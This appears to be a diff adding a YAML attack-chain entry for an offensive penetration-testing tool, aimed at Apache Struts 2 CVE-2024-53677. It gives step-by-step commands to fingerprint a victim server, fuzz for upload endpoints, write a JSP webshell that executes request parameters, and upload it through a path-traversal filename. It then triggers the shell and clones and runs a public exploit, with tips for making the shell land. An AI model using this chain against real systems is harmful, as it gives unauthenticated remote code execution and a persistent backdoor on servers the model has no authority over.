@@ -1,0 +1,69 @@
+chain_id: struts2_cve_2024_53677
+title: "Apache Struts 2 — CVE-2024-53677 file-upload path traversal → RCE"
+severity: CRITICAL
+tags: [web, struts, struts2, cve-2024-53677, file-upload, path-traversal, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-53677" }
+    - { banner_pattern: "(?i)struts" }
+    - { product_pattern: "(?i)struts" }
+    - { path_pattern: "(?i)\\.action$|/struts2" }
+
+description: |
+  Struts 2 < 6.4.0 (and Struts 2.0.0 → 2.5.33): the `FileUploadInterceptor`
+  uses the user-supplied `Content-Disposition` filename without
+  canonicalization, allowing `../` traversal to write the upload
+  anywhere on disk. Drop a JSP into the webapp root and you have
+  unauth RCE. Disclosed Dec 2024, mass-scanned in days. The
+  CVE-2017-5638 successor.
+
+steps:
+  - id: 1
+    title: "Fingerprint Struts 2"
+    command: |
+      curl -sk -i "http://$VICTIMA/" | grep -i 'struts'
+      curl -sk -I "http://$VICTIMA/index.action"
+
+  - id: 2
+    title: "Find an upload action endpoint"
+    command: |
+      ffuf -u "http://$VICTIMA/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt -e .action -mc 200
+
+  - id: 3
+    title: "Upload a JSP webshell with a traversal filename"
+    command: |
+      cat > shell.jsp <<'JSP'
+      <%@ page import="java.util.*,java.io.*"%>
+      <% Process p=Runtime.getRuntime().exec(request.getParameter("c"));
+         BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
+         String l; while((l=r.readLine())!=null) out.println(l); %>
+      JSP
+
+      curl -sk -i "http://$VICTIMA/upload.action" \
+        -F 'top.UploadFileName=../../../webapps/ROOT/shell.jsp' \
+        -F 'top.upload=@shell.jsp;type=text/plain'
+
+  - id: 4
+    title: "Trigger"
+    command: |
+      curl -sk "http://$VICTIMA/shell.jsp?c=id"
+
+  - id: 5
+    title: "Public PoC + nuclei"
+    command: |
+      git clone https://github.com/TAM-K592/CVE-2024-53677 /tmp/struts53677
+      python3 /tmp/struts53677/exploit.py -u http://$VICTIMA -c id
+      nuclei -u http://$VICTIMA -t http/cves/2024/CVE-2024-53677.yaml
+
+common_errors:
+  - error: "Upload returns 200 but shell.jsp 404s"
+    solution: |
+      Webapp directory layout differs (Tomcat ROOT vs deployed app).
+      Probe with several traversal depths
+      (`../../../webapps/<app>/`, `../../webapps/ROOT/`,
+      `../../../../var/lib/tomcat/webapps/ROOT/`).
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-53677
+  - https://cwiki.apache.org/confluence/display/WW/S2-067
